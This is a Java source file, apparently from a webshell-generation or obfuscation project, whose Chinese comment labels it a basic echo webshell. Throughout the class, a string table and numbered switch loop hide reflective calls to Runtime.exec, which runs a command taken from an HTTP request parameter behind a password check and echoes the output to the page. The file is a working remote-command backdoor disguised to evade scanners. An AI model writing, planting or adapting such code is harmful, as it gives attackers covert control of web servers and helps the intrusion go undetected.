package org.sec.util;

/**
 * 基础回显Webshell
 */
public class Base {
    public static void main(String[] args) {
        try {
            String[] globalArr = new String[]{"0|1|2|3|4|5|6|7|8|9|10|11|12|13", "pwd", "cmd", "java.lang.Runtime",
                    "getRuntime", "exec", "<pre>", "</pre>"};
            String temp = globalArr[0];
            String[] b = temp.split("\\|");
            int index = 0;
            String passwd = null;
            String cmd = null;
            Class rt = null;
            java.lang.reflect.Method gr = null;
            java.lang.reflect.Method ex = null;
            Process process = null;
            java.io.InputStream in = null;
            java.io.InputStreamReader resulutReader = null;
            java.io.BufferedReader stdInput = null;

            byte bytes[] = null;
            while (true) {
                int op = Integer.parseInt(b[index++]);
                switch (op) {
                    case 0:
                        passwd = request.getParameter(globalArr[1]);
                        break;
                    case 1:
                        cmd = request.getParameter(globalArr[2]);
                        break;
                    case 2:
                        if (!passwd.equals(PASSWORD)) {
                            return;
                        }
                        break;
                    case 3:
                        rt = Class.forName(globalArr[3]);
                        break;
                    case 4:
                        gr = rt.getMethod(globalArr[4]);
                        break;
                    case 5:
                        ex = rt.getMethod(globalArr[5], String.class);
                        break;
                    case 6:
                        process = (Process) ex.invoke(gr.invoke(null), cmd);
                        break;
                    case 7:
                        in = process.getInputStream();
                        break;
                    case 8:
                        bytes = new byte[2048];
                        break;
                    case 9:
                        out.print(globalArr[6]);
                        break;
                    case 10:
                        resulutReader = new java.io.InputStreamReader(in);
                        break;
                    case 11:
                         stdInput = new java.io.BufferedReader(resulutReader);
                    case 12:
                        String s = null;
                        while ((s = stdInput.readLine()) != null) {
                            out.println(s);
                        }
                        break;
                    case 13:
                        out.print(globalArr[7]);
                        break;
                }
            }
        } catch (Exception ignored) {

        }
    }
}